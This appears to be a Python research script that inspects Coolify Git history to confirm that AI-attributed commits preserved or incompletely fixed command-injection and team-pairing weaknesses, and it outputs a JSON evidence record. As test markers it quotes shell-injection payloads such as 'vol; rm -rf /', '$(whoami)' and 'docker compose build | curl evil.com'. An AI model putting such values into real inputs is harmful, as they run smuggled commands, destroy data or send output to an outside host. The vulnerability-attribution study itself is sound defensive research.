#!/usr/bin/env python3
"""Freeze recall-recovered Coolify AI security-preservation contributors."""

from __future__ import annotations

import argparse
import hashlib
from pathlib import Path

from cohort_coolify_postgresql_query_idor_path_extension_witness import (
    _atomic_json,
    _commit_metadata,
    _git,
    _git_blob,
    _is_ancestor,
    _php_method_region,
)


LIVEWIRE_MIGRATION_SHA = "f77ad4cbd9ee82d3015e36ab8d23121f1a8143dd"
FRONTEND_PATH_NORMALIZATION_SHA = "8714d9bd0332a29275750f2f58fab043df2d677a"
INCOMPLETE_PATH_VALIDATION_SHA = "1499135409818334b18002af916d8b12babce712"
INVALID_PATH_RESTORE_SHA = "dae680317385f2a495b0ae2b1687d2ce8f555256"
DESTINATION_SCOPE_FIX_SHA = "59111e8cf35824b691790cc018d76d2c5a331793"

GIT_REF_REPAIR_SHA = "a1c30cb0e70b84e075d1c444362e7b198ad459e3"
APPLICATION_SHELL_REPAIR_SHA = "23f9156c7306b221101f1ebbe4d3c6b5e2522acd"
VOLUME_REPAIR_SHA = "410a9a6195a2b939d4a429f6c464ff56e61177f8"
DESTINATION_PAIRING_REPAIR_SHA = "f44ace3965167a62a4e7169c87f7b1edcfa9ba72"

GENERAL_PATH = "app/Livewire/Project/Application/General.php"
APPLICATION_MODEL_PATH = "app/Models/Application.php"
STORAGE_PATH = "app/Livewire/Project/Shared/Storages/Show.php"
DEPLOYMENT_JOB_PATH = "app/Jobs/ApplicationDeploymentJob.php"
DESTINATION_PATH = "app/Livewire/Project/Shared/Destination.php"
GIT_REF_TEST_PATH = "tests/Unit/GitRefValidationTest.php"
APPLICATION_SHELL_TEST_PATH = "tests/Feature/CommandInjectionSecurityTest.php"
VOLUME_TEST_PATH = "tests/Unit/PersistentVolumeSecurityTest.php"
DESTINATION_TEST_PATH = "tests/Feature/CrossTeamDestinationAttachTest.php"


def _parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--repository", type=Path, required=True)
    parser.add_argument("--output", type=Path, required=True)
    return parser.parse_args(argv)


def _text_blob(repository: Path, revision: str, source_path: str) -> str:
    return _git_blob(repository, revision, source_path).decode("utf-8")


def _blob_record(repository: Path, revision: str, source_path: str) -> dict[str, str]:
    blob = _git_blob(repository, revision, source_path)
    return {
        "revision": revision,
        "path": source_path,
        "sha256": hashlib.sha256(blob).hexdigest(),
    }


def _line_number(source: str, marker: str) -> int:
    matches = [
        index + 1
        for index, line in enumerate(source.splitlines())
        if marker in line
    ]
    if len(matches) != 1:
        raise SystemExit(f"expected one marker {marker!r}, found {matches}")
    return matches[0]


def _line_in_method(source: str, method: str, marker: str) -> int:
    region = _php_method_region(source, method)
    method_offset = source.index(region)
    prefix_lines = source[:method_offset].count("\n")
    return prefix_lines + _line_number(region, marker)


def _blame_line(
    repository: Path,
    revision: str,
    source_path: str,
    line: int,
    marker: str,
) -> dict[str, object]:
    value = _git(
        repository,
        [
            "blame",
            "--line-porcelain",
            "-L",
            f"{line},{line}",
            revision,
            "--",
            source_path,
        ],
        text=True,
    )
    assert isinstance(value, str)
    return {
        "revision": revision,
        "path": source_path,
        "line": line,
        "marker": marker,
        "origin_sha": value.split(None, 1)[0].lstrip("^"),
    }


def _evaluate_git_ref(candidate: str, repair: str, repair_test: str) -> dict[str, bool]:
    candidate_sync = _php_method_region(candidate, "syncData")
    repair_sync = _php_method_region(repair, "syncData")
    return {
        "candidate_exposes_public_git_ref": (
            "public ?string $git_commit_sha = null;" in candidate
        ),
        "candidate_uses_nullable_only_rule": (
            "'git_commit_sha' => 'nullable'" in candidate
        ),
        "candidate_persists_unvalidated_git_ref": (
            "$this->application->git_commit_sha = $this->git_commit_sha;"
            in candidate_sync
        ),
        "repair_preserves_same_model_sink": (
            "$this->application->git_commit_sha = $this->gitCommitSha;"
            in repair_sync
        ),
        "repair_adds_git_ref_allowlist": (
            "'gitCommitSha' => ['nullable', 'regex:/^[a-zA-Z0-9]"
            in repair
        ),
        "repair_test_has_advisory_poc": (
            "HEAD'; whoami >/tmp/coolify_poc_git; #" in repair_test
        ),
        "repair_test_has_command_substitution": "$(whoami)" in repair_test,
    }


def _evaluate_application_shell(
    migration: str,
    frontend_normalization: str,
    incomplete_validation: str,
    invalid_path_restore: str,
    invalid_path_restore_model: str,
    repair: str,
    repair_job: str,
    repair_test: str,
) -> dict[str, bool]:
    migration_sync = _php_method_region(migration, "syncData")
    frontend_submit = _php_method_region(frontend_normalization, "submit")
    incomplete_submit = _php_method_region(incomplete_validation, "submit")
    restore_submit = _php_method_region(invalid_path_restore, "submit")
    restore_model_load = _php_method_region(
        invalid_path_restore_model, "loadComposeFile"
    )
    unsafe_fields = (
        ("base_directory", "baseDirectory"),
        ("dockerfile_target_build", "dockerfileTargetBuild"),
        ("docker_compose_custom_start_command", "dockerComposeCustomStartCommand"),
        ("docker_compose_custom_build_command", "dockerComposeCustomBuildCommand"),
        ("custom_docker_run_options", "customDockerRunOptions"),
        ("pre_deployment_command_container", "preDeploymentCommandContainer"),
        ("post_deployment_command_container", "postDeploymentCommandContainer"),
    )
    return {
        "migration_adds_weak_rules_for_shell_fields": all(
            f"'{snake}' => 'nullable'" in migration
            or (snake == "base_directory" and "'base_directory' => 'required'" in migration)
            for snake, _camel in unsafe_fields
        ),
        "migration_persists_shell_fields": all(
            f"$this->application->{snake} = $this->{snake};" in migration_sync
            for snake, _camel in unsafe_fields
        ),
        "frontend_normalization_only_trims_paths": (
            "$this->baseDirectory = rtrim($this->baseDirectory, '/');"
            in frontend_submit
            and "'baseDirectory' => 'required'" in frontend_normalization
            and "directoryPathRules" not in frontend_normalization
        ),
        "incomplete_validation_checks_before_save_but_not_shell_safety": (
            "Validate docker compose file path BEFORE saving to database"
            in incomplete_submit
            and "'baseDirectory' => 'required'" in incomplete_validation
            and "directoryPathRules" not in incomplete_validation
        ),
        "restore_fix_preserves_weak_path_and_shell_rules": all(
            marker in invalid_path_restore
            for marker in (
                "'baseDirectory' => 'required'",
                "'dockerComposeLocation' => 'nullable'",
                "'dockerComposeCustomStartCommand' => 'nullable'",
                "'dockerComposeCustomBuildCommand' => 'nullable'",
            )
        )
        and "directoryPathRules" not in invalid_path_restore
        and "shellSafeCommandRules" not in invalid_path_restore,
        "restore_fix_rebuilds_failure_restore_lifecycle": all(
            marker in restore_submit
            for marker in (
                "restoreBaseDirectory: $oldBaseDirectory",
                "restoreDockerComposeLocation: $oldDockerComposeLocation",
                "$this->application->refresh()",
            )
        ),
        "restore_fix_still_executes_paths_before_finally_restore": all(
            marker in restore_model_load
            for marker in (
                '$fileList = collect([".$workdir$composeFile"])',
                '"git sparse-checkout set {$fileList->implode(\' \')}"',
                '"cat .$workdir$composeFile"',
                "$this->docker_compose_location = $initialDockerComposeLocation",
                "$this->base_directory = $initialBaseDirectory",
            )
        )
        and restore_model_load.find("instant_remote_process($commands")
        < restore_model_load.find(
            "$this->docker_compose_location = $initialDockerComposeLocation"
        ),
        "repair_adds_directory_rules": (
            "'baseDirectory' => array_merge(['required'], array_slice(ValidationPatterns::directoryPathRules(), 1))"
            in repair
        ),
        "repair_adds_shell_command_rules": all(
            marker in repair
            for marker in (
                "'dockerfileTargetBuild' => ValidationPatterns::dockerTargetRules()",
                "'dockerComposeCustomStartCommand' => ValidationPatterns::shellSafeCommandRules()",
                "'dockerComposeCustomBuildCommand' => ValidationPatterns::shellSafeCommandRules()",
                "'customDockerRunOptions' => ValidationPatterns::shellSafeCommandRules(2000)",
                "'preDeploymentCommandContainer' => ['nullable', ...ValidationPatterns::containerNameRules()]",
            )
        ),
        "repair_adds_runtime_validation": all(
            marker in repair_job
            for marker in (
                "$this->validatePathField($baseDir, 'base_directory')",
                "$this->validateShellSafeCommand($this->application->docker_compose_custom_start_command",
                "$this->validateContainerName($containerName)",
            )
        ),
        "repair_tests_shell_payloads": all(
            marker in repair_test
            for marker in (
                "/src; echo pwned",
                "builder$(whoami)",
                "docker compose build | curl evil.com",
                "--hostname=$(whoami)",
            )
        ),
    }


def _evaluate_volume(migration: str, repair: str, repair_test: str) -> dict[str, bool]:
    migration_sync = _php_method_region(migration, "syncData")
    repair_sync = _php_method_region(repair, "syncData")
    return {
        "migration_exposes_explicit_volume_properties": all(
            marker in migration
            for marker in (
                "public string $name;",
                "public string $mountPath;",
                "public ?string $hostPath = null;",
            )
        ),
        "migration_uses_string_only_volume_rules": all(
            marker in migration
            for marker in (
                "'name' => 'required|string'",
                "'mountPath' => 'required|string'",
                "'hostPath' => 'string|nullable'",
            )
        ),
        "migration_persists_volume_inputs": all(
            marker in migration_sync
            for marker in (
                "$this->storage->name = $this->name;",
                "$this->storage->mount_path = $this->mountPath;",
                "$this->storage->host_path = $this->hostPath;",
            )
        ),
        "repair_preserves_same_volume_sinks": all(
            marker in repair_sync
            for marker in (
                "$this->storage->name = $this->name;",
                "$this->storage->mount_path = $this->mountPath;",
                "$this->storage->host_path = $this->hostPath;",
            )
        ),
        "repair_adds_volume_name_rule": (
            "'name' => ValidationPatterns::volumeNameRules()" in repair
        ),
        "repair_adds_path_allowlists": all(
            marker in repair
            for marker in (
                "'mountPath' => ['required', 'string', 'regex:'.ValidationPatterns::DIRECTORY_PATH_PATTERN]",
                "'hostPath' => ['nullable', 'string', 'regex:'.ValidationPatterns::DIRECTORY_PATH_PATTERN]",
            )
        ),
        "repair_test_names_advisory": "GHSA-mh8x-fppq-cp77" in repair_test,
        "repair_test_has_volume_injection_payloads": all(
            marker in repair_test
            for marker in ("vol; rm -rf /", "vol$(whoami)", "/etc`id`")
        ),
    }


def _evaluate_destination_pairing(
    candidate: str,
    candidate_test: str,
    repair: str,
    repair_test: str,
) -> dict[str, bool]:
    candidate_add = _php_method_region(candidate, "addServer")
    candidate_promote = _php_method_region(candidate, "promote")
    repair_add = _php_method_region(repair, "addServer")
    repair_promote = _php_method_region(repair, "promote")
    independent_lookup_markers = (
        "$server = Server::ownedByCurrentTeam()->findOrFail($server_id);",
        "$network = StandaloneDocker::ownedByCurrentTeam()->findOrFail($network_id);",
    )
    paired_lookup = (
        "$network = StandaloneDocker::ownedByCurrentTeam()"
        "->where('server_id', $server->id)->findOrFail($network_id);"
    )
    return {
        "candidate_scopes_both_resources_to_team": all(
            all(marker in method for marker in independent_lookup_markers)
            for method in (candidate_add, candidate_promote)
        ),
        "candidate_uses_unpaired_ids_together": (
            "attach($network->id, ['server_id' => $server->id])" in candidate_add
            and "'destination_id' => $network->id" in candidate_promote
            and "detach($network->id, ['server_id' => $server->id])"
            in candidate_promote
        ),
        "candidate_tests_cross_team_scope": (
            "cannot attach another team" in candidate_test
            and "can attach own team" in candidate_test
        ),
        "candidate_lacks_same_team_pairing_test": (
            "wrong own server" not in candidate_test
        ),
        "repair_binds_network_to_selected_server": all(
            paired_lookup in method for method in (repair_add, repair_promote)
        ),
        "repair_tests_same_team_mismatch": all(
            marker in repair_test
            for marker in (
                "cannot attach own network paired with wrong own server",
                "cannot promote own network paired with wrong own server",
            )
        ),
    }


def main(argv: list[str] | None = None) -> int:
    args = _parse_args(argv)
    repository = args.repository.resolve()
    if not repository.is_dir() or not (repository / ".git").exists():
        raise SystemExit(f"repository is not a Git checkout: {repository}")

    migration_general = _text_blob(repository, LIVEWIRE_MIGRATION_SHA, GENERAL_PATH)
    migration_storage = _text_blob(repository, LIVEWIRE_MIGRATION_SHA, STORAGE_PATH)
    git_repair = _text_blob(repository, GIT_REF_REPAIR_SHA, GENERAL_PATH)
    git_repair_test = _text_blob(repository, GIT_REF_REPAIR_SHA, GIT_REF_TEST_PATH)
    frontend_normalization = _text_blob(
        repository, FRONTEND_PATH_NORMALIZATION_SHA, GENERAL_PATH
    )
    incomplete_validation = _text_blob(
        repository, INCOMPLETE_PATH_VALIDATION_SHA, GENERAL_PATH
    )
    invalid_path_restore = _text_blob(
        repository, INVALID_PATH_RESTORE_SHA, GENERAL_PATH
    )
    invalid_path_restore_model = _text_blob(
        repository, INVALID_PATH_RESTORE_SHA, APPLICATION_MODEL_PATH
    )
    shell_repair = _text_blob(repository, APPLICATION_SHELL_REPAIR_SHA, GENERAL_PATH)
    shell_repair_job = _text_blob(
        repository, APPLICATION_SHELL_REPAIR_SHA, DEPLOYMENT_JOB_PATH
    )
    shell_repair_test = _text_blob(
        repository, APPLICATION_SHELL_REPAIR_SHA, APPLICATION_SHELL_TEST_PATH
    )
    volume_repair = _text_blob(repository, VOLUME_REPAIR_SHA, STORAGE_PATH)
    volume_repair_test = _text_blob(repository, VOLUME_REPAIR_SHA, VOLUME_TEST_PATH)
    destination_candidate = _text_blob(
        repository, DESTINATION_SCOPE_FIX_SHA, DESTINATION_PATH
    )
    destination_candidate_test = _text_blob(
        repository, DESTINATION_SCOPE_FIX_SHA, DESTINATION_TEST_PATH
    )
    destination_repair = _text_blob(
        repository, DESTINATION_PAIRING_REPAIR_SHA, DESTINATION_PATH
    )
    destination_repair_test = _text_blob(
        repository, DESTINATION_PAIRING_REPAIR_SHA, DESTINATION_TEST_PATH
    )

    evaluations = {
        "git_ref_dataflow": _evaluate_git_ref(
            migration_general, git_repair, git_repair_test
        ),
        "application_shell_inputs": _evaluate_application_shell(
            migration_general,
            frontend_normalization,
            incomplete_validation,
            invalid_path_restore,
            invalid_path_restore_model,
            shell_repair,
            shell_repair_job,
            shell_repair_test,
        ),
        "persistent_volume_inputs": _evaluate_volume(
            migration_storage, volume_repair, volume_repair_test
        ),
        "destination_pairing": _evaluate_destination_pairing(
            destination_candidate,
            destination_candidate_test,
            destination_repair,
            destination_repair_test,
        ),
    }

    metadata = {
        sha: _commit_metadata(repository, sha)
        for sha in (
            LIVEWIRE_MIGRATION_SHA,
            FRONTEND_PATH_NORMALIZATION_SHA,
            INCOMPLETE_PATH_VALIDATION_SHA,
            INVALID_PATH_RESTORE_SHA,
            DESTINATION_SCOPE_FIX_SHA,
        )
    }
    ancestry = {
        f"{candidate}->{repair}": _is_ancestor(repository, candidate, repair)
        for candidate, repair in (
            (LIVEWIRE_MIGRATION_SHA, GIT_REF_REPAIR_SHA),
            (LIVEWIRE_MIGRATION_SHA, APPLICATION_SHELL_REPAIR_SHA),
            (FRONTEND_PATH_NORMALIZATION_SHA, APPLICATION_SHELL_REPAIR_SHA),
            (INCOMPLETE_PATH_VALIDATION_SHA, APPLICATION_SHELL_REPAIR_SHA),
            (INVALID_PATH_RESTORE_SHA, APPLICATION_SHELL_REPAIR_SHA),
            (LIVEWIRE_MIGRATION_SHA, VOLUME_REPAIR_SHA),
            (DESTINATION_SCOPE_FIX_SHA, DESTINATION_PAIRING_REPAIR_SHA),
        )
    }
    line_origins = {
        "migration_git_ref_persistence": _blame_line(
            repository,
            LIVEWIRE_MIGRATION_SHA,
            GENERAL_PATH,
            _line_in_method(
                migration_general,
                "syncData",
                "$this->application->git_commit_sha = $this->git_commit_sha;",
            ),
            "unvalidated git ref persistence",
        ),
        "migration_shell_field_persistence": _blame_line(
            repository,
            LIVEWIRE_MIGRATION_SHA,
            GENERAL_PATH,
            _line_in_method(
                migration_general,
                "syncData",
                "$this->application->docker_compose_custom_start_command = $this->docker_compose_custom_start_command;",
            ),
            "unvalidated custom compose command persistence",
        ),
        "frontend_path_normalization": _blame_line(
            repository,
            FRONTEND_PATH_NORMALIZATION_SHA,
            GENERAL_PATH,
            _line_in_method(
                frontend_normalization,
                "submit",
                "$oldBaseDirectory = $this->application->base_directory;",
            ),
            "functional base-directory validation path",
        ),
        "incomplete_path_validation": _blame_line(
            repository,
            INCOMPLETE_PATH_VALIDATION_SHA,
            GENERAL_PATH,
            _line_in_method(
                incomplete_validation,
                "submit",
                "Validate docker compose file path BEFORE saving to database",
            ),
            "incomplete path validation before persistence",
        ),
        "invalid_path_restore_lifecycle": _blame_line(
            repository,
            INVALID_PATH_RESTORE_SHA,
            GENERAL_PATH,
            _line_in_method(
                invalid_path_restore,
                "submit",
                "restoreDockerComposeLocation: $oldDockerComposeLocation",
            ),
            "restore invalid compose path after functional failure",
        ),
        "migration_volume_rule": _blame_line(
            repository,
            LIVEWIRE_MIGRATION_SHA,
            STORAGE_PATH,
            _line_number(migration_storage, "'hostPath' => 'string|nullable'"),
            "string-only host path validation",
        ),
        "destination_unpaired_lookup": _blame_line(
            repository,
            DESTINATION_SCOPE_FIX_SHA,
            DESTINATION_PATH,
            _line_in_method(
                destination_candidate,
                "addServer",
                "$network = StandaloneDocker::ownedByCurrentTeam()->findOrFail($network_id);",
            ),
            "independently team-scoped network lookup",
        ),
        "git_ref_repair_rule": _blame_line(
            repository,
            GIT_REF_REPAIR_SHA,
            GENERAL_PATH,
            _line_number(
                git_repair,
                "'gitCommitSha' => ['nullable', 'regex:/^[a-zA-Z0-9]",
            ),
            "git ref allowlist",
        ),
        "shell_repair_rule": _blame_line(
            repository,
            APPLICATION_SHELL_REPAIR_SHA,
            GENERAL_PATH,
            _line_number(
                shell_repair,
                "'dockerComposeCustomStartCommand' => ValidationPatterns::shellSafeCommandRules()",
            ),
            "custom compose command allowlist",
        ),
        "volume_repair_rule": _blame_line(
            repository,
            VOLUME_REPAIR_SHA,
            STORAGE_PATH,
            _line_number(volume_repair, "'name' => ValidationPatterns::volumeNameRules()"),
            "volume name allowlist",
        ),
        "destination_pairing_repair": _blame_line(
            repository,
            DESTINATION_PAIRING_REPAIR_SHA,
            DESTINATION_PATH,
            _line_in_method(
                destination_repair,
                "addServer",
                "$network = StandaloneDocker::ownedByCurrentTeam()->where('server_id', $server->id)->findOrFail($network_id);",
            ),
            "network-server pairing constraint",
        ),
    }

    candidate_origin_expectations = {
        "migration_git_ref_persistence": LIVEWIRE_MIGRATION_SHA,
        "migration_shell_field_persistence": LIVEWIRE_MIGRATION_SHA,
        "frontend_path_normalization": FRONTEND_PATH_NORMALIZATION_SHA,
        "incomplete_path_validation": INCOMPLETE_PATH_VALIDATION_SHA,
        "invalid_path_restore_lifecycle": INVALID_PATH_RESTORE_SHA,
        "migration_volume_rule": LIVEWIRE_MIGRATION_SHA,
        "destination_unpaired_lookup": DESTINATION_SCOPE_FIX_SHA,
    }
    repair_origin_expectations = {
        "git_ref_repair_rule": GIT_REF_REPAIR_SHA,
        "shell_repair_rule": APPLICATION_SHELL_REPAIR_SHA,
        "volume_repair_rule": VOLUME_REPAIR_SHA,
        "destination_pairing_repair": DESTINATION_PAIRING_REPAIR_SHA,
    }
    witness_passed = bool(
        all(item["explicit_claude_signal"] is True for item in metadata.values())
        and all(ancestry.values())
        and all(all(checks.values()) for checks in evaluations.values())
        and all(
            line_origins[key]["origin_sha"] == expected
            for key, expected in candidate_origin_expectations.items()
        )
        and all(
            line_origins[key]["origin_sha"] == expected
            for key, expected in repair_origin_expectations.items()
        )
    )

    candidate_edges = [
        {
            "candidate_sha": LIVEWIRE_MIGRATION_SHA,
            "fix_sha": GIT_REF_REPAIR_SHA,
            "causal_adjudication": "CONFIRMED_AI_GIT_REF_DATAFLOW_PRESERVATION_CONTRIBUTOR",
            "mechanism_group": "git_ref_command_injection",
        },
        {
            "candidate_sha": LIVEWIRE_MIGRATION_SHA,
            "fix_sha": APPLICATION_SHELL_REPAIR_SHA,
            "causal_adjudication": "CONFIRMED_AI_SHELL_INPUT_DATAFLOW_PRESERVATION_CONTRIBUTOR",
            "mechanism_group": "application_setting_command_injection",
        },
        {
            "candidate_sha": FRONTEND_PATH_NORMALIZATION_SHA,
            "fix_sha": APPLICATION_SHELL_REPAIR_SHA,
            "causal_adjudication": "CONFIRMED_AI_PATH_NORMALIZATION_PRESERVATION_CONTRIBUTOR",
            "mechanism_group": "application_setting_command_injection",
        },
        {
            "candidate_sha": INCOMPLETE_PATH_VALIDATION_SHA,
            "fix_sha": APPLICATION_SHELL_REPAIR_SHA,
            "causal_adjudication": "CONFIRMED_AI_INCOMPLETE_PATH_VALIDATION_CONTRIBUTOR",
            "mechanism_group": "application_setting_command_injection",
        },
        {
            "candidate_sha": INVALID_PATH_RESTORE_SHA,
            "fix_sha": APPLICATION_SHELL_REPAIR_SHA,
            "causal_adjudication": "CONFIRMED_AI_POST_EXECUTION_PATH_RESTORE_CONTRIBUTOR",
            "mechanism_group": "application_setting_command_injection",
        },
        {
            "candidate_sha": LIVEWIRE_MIGRATION_SHA,
            "fix_sha": VOLUME_REPAIR_SHA,
            "causal_adjudication": "CONFIRMED_AI_VOLUME_INPUT_DATAFLOW_PRESERVATION_CONTRIBUTOR",
            "mechanism_group": "persistent_volume_command_injection",
        },
        {
            "candidate_sha": DESTINATION_SCOPE_FIX_SHA,
            "fix_sha": DESTINATION_PAIRING_REPAIR_SHA,
            "causal_adjudication": "CONFIRMED_AI_INCOMPLETE_RESOURCE_PAIRING_FIX",
            "mechanism_group": "destination_network_server_pairing",
        },
    ]
    payload = {
        "schema_version": 1,
        "artifact_kind": "coolify_security_frontier_preservation_witness",
        "repository_identity": "github.com/coollabsio/coolify",
        "candidate_edges": candidate_edges,
        "candidate_metadata": metadata,
        "ancestry": ancestry,
        "evaluations": evaluations,
        "line_origins": line_origins,
        "source_blobs": [
            _blob_record(repository, LIVEWIRE_MIGRATION_SHA, GENERAL_PATH),
            _blob_record(repository, LIVEWIRE_MIGRATION_SHA, STORAGE_PATH),
            _blob_record(repository, FRONTEND_PATH_NORMALIZATION_SHA, GENERAL_PATH),
            _blob_record(repository, INCOMPLETE_PATH_VALIDATION_SHA, GENERAL_PATH),
            _blob_record(repository, INVALID_PATH_RESTORE_SHA, GENERAL_PATH),
            _blob_record(
                repository, INVALID_PATH_RESTORE_SHA, APPLICATION_MODEL_PATH
            ),
            _blob_record(repository, GIT_REF_REPAIR_SHA, GENERAL_PATH),
            _blob_record(repository, GIT_REF_REPAIR_SHA, GIT_REF_TEST_PATH),
            _blob_record(repository, APPLICATION_SHELL_REPAIR_SHA, GENERAL_PATH),
            _blob_record(repository, APPLICATION_SHELL_REPAIR_SHA, DEPLOYMENT_JOB_PATH),
            _blob_record(
                repository, APPLICATION_SHELL_REPAIR_SHA, APPLICATION_SHELL_TEST_PATH
            ),
            _blob_record(repository, VOLUME_REPAIR_SHA, STORAGE_PATH),
            _blob_record(repository, VOLUME_REPAIR_SHA, VOLUME_TEST_PATH),
            _blob_record(repository, DESTINATION_SCOPE_FIX_SHA, DESTINATION_PATH),
            _blob_record(repository, DESTINATION_SCOPE_FIX_SHA, DESTINATION_TEST_PATH),
            _blob_record(repository, DESTINATION_PAIRING_REPAIR_SHA, DESTINATION_PATH),
            _blob_record(
                repository, DESTINATION_PAIRING_REPAIR_SHA, DESTINATION_TEST_PATH
            ),
        ],
        "witness_passed": witness_passed,
        "counting": {
            "candidate_fix_true_positive_edge_count": len(candidate_edges),
            "unique_ai_candidate_count": len(
                {edge["candidate_sha"] for edge in candidate_edges}
            ),
            "mechanism_group_count": len(
                {edge["mechanism_group"] for edge in candidate_edges}
            ),
            "earliest_mechanism_root_is_ai_not_asserted": True,
            "unique_advisory_increment_not_asserted": True,
        },
        "claim_boundary": (
            "These seven candidate-fix edges are source-level preservation or incomplete-"
            "fix contributors, not claims that the AI commits are the earliest origin of "
            "four distinct vulnerabilities. The Livewire migration explicitly rebuilt "
            "weakly validated Git-ref, application shell-setting, and persistent-volume "
            "input-to-model flows. Three later Claude path-handling commits normalized, "
            "functionally validated, or restored paths only after a failed shell-backed "
            "load without adding the shell-safe allowlists that "
            "the authenticated-RCE repair later introduced. The Claude-assisted "
            "destination fix independently team-scoped a server and network, while the "
            "follow-up repair bound the network lookup to the selected server and added "
            "same-team mismatch tests. Evidence is frozen source, blame ownership, "
            "ancestry, explicit commit attribution, and repair tests; no runtime exploit "
            "or advisory-level uniqueness is asserted."
        ),
    }
    _atomic_json(args.output, payload)
    print("Coolify security-frontier preservation witness frozen")
    print(f"  candidate-fix TP edges: {len(candidate_edges)}")
    print(f"  unique AI candidates  : {payload['counting']['unique_ai_candidate_count']}")
    print(f"  witness               : {'PASS' if witness_passed else 'FAIL'}")
    print(f"  output                : {args.output}")
    return 0 if witness_passed else 2


if __name__ == "__main__":
    raise SystemExit(main())
